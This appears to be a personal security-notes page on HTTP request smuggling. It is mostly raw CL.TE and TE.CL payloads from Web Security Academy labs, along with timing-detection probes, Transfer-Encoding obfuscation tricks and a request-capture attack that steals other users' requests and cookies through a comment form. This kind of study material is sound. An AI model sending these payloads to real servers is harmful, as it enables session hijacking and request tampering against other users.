---
layout: app
title: "HTTP Smuggling"
tags: ["Web","Attacks","Host Header"]
---

This attack consist in split the HTTP Request using the Transfer-Encoding and Content-Length headers.


# Techniques

[Tag: Smuggling RBleug](https://regilero.github.io/tag/Smuggling/)

# Explanation

## CL.TE

<aside>
<img src="https://cdn4.iconfinder.com/data/icons/office-and-business-conceptual-flat/169/5-256.png" alt="https://cdn4.iconfinder.com/data/icons/office-and-business-conceptual-flat/169/5-256.png" width="40px" /> Server doesn’t support **Transfer-Encoding**

</aside>

![Untitled](/assets/images/cl_te.png)

## TE.CL

![Untitled](/assets/images/TE_CL.png)

## Attacks

### Capture User’s requests

```javascript
POST / HTTP/1.1
Host: 0aa800ab04c168b880ad8fc300bc00ae.web-security-academy.net
Content-Length:477
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0aa800ab04c168b880ad8fc300bc00ae.web-security-academy.net
Cookie: session=QOZiis6EvY1JJXSq7dbZF2fyupBg7WiU
Content-Type: application/x-www-form-urlencoded
Content-Length: 480

csrf=akQkRQRFgsvpwiy6M7yV2jl6PktUoUZ9&postId=5&name=name&email=cyberbob%40ginandjuice.shop&website=https%3A%2F%2Fg.com&comment=GET / HTTP/1.1
Host: 0aa800ab04c168b880ad8fc300bc00ae.web-security-academy.net
Cookie: session=QOZiis6EvY1JJXSq7dbZF2fyupBg7WiU
```

# Detection

## Timing Detection

### CL.TE

```javascript
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
**Content-Length: 4**

1\r\n
A\r\n
**X**
```

**Request**

```javascript
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

### **Response**

```javascript
**GET /404 HTTP/1.1
Foo: x**POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### TE.CL

```javascript
POST / HTTP/1.1
Host: vulnerable-website.com
**Transfer-Encoding: chunked**
Content-Length: 6

0
\r\n
**X**
```

```javascript
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0\r\n\r\n
```

```javascript
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
\r\n
x=1
0\r\n\r\n
```

# Transfer-Encoding: chunked

When sent with a chunked value, the request will be split into multiple requests and a new line (\r\n) will be added to the end of the each request.

### Try to hide header

```javascript
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
```

```javascript
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```javascript
Transfer-Encoding:[tab]chunked
```

```javascript
GET / HTTP/1.1
  Transfer-Encoding: chunked
```

```javascript
X: X[\n]Transfer-Encoding: chunked
```

```javascript
Transfer-Encoding
  : chunked
```

# CL.TE

Front-End uses `Content-Length` and Back-End uses `Transfer-Encoding`

```javascript
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## TE.CL

Front-End uses `Transfer-Encoding` and Back-End uses `Content-Length`

```javascript
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

![Untitled](/assets/images/smuggled.png)

### Sample

```javascript
POST / HTTP/1.1
Host: 0aa700fa04eb999b8002a8cf008f0098.web-security-academy.net
Cookie: session=4kjdhYqNrOeKkufPrX3GezgR2twG0AQH
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers
Transfer-Encoding: chunked
Content-Length: **4**
Content-Type: application/x-www-form-urlencoded

**5c\r\n**
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
**Content-Length: 15**

x=1
0
```